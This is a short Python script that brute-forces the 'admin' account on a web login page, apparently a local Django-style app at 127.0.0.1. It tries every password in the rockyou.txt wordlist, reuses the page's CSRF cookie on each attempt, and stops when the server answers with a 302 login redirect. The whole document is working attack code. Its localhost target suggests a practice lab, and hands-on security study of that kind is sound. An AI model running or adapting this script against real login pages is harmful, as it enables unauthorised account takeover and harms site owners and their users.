# coding: utf-8
from binascii import hexlify
from hashlib import sha256
from tqdm import tqdm
import requests
import sys
def main():
  with open("rockyou.txt",encoding='utf-8') as f:
    # tqdm didn't work well ... but it still could show how many passwords have been checked.
      for line in tqdm(f.readlines()):
        send_test(line.strip())

def send_test(password):
    # get cookie
    r = requests.get("http://127.0.0.1:8000/login.html")
    # embed cookie
    r = requests.post(url="http://127.0.0.1:8000/login.html",cookies=r.cookies,data={'uname':'admin','pword':password,"csrfmiddlewaretoken":r.cookies["csrftoken"]})
    # login succed
    if(r.status_code==302):
      print("password:"+password)
      sys.exit()

if __name__ == '__main__':
    main()
    # send_test("1234")
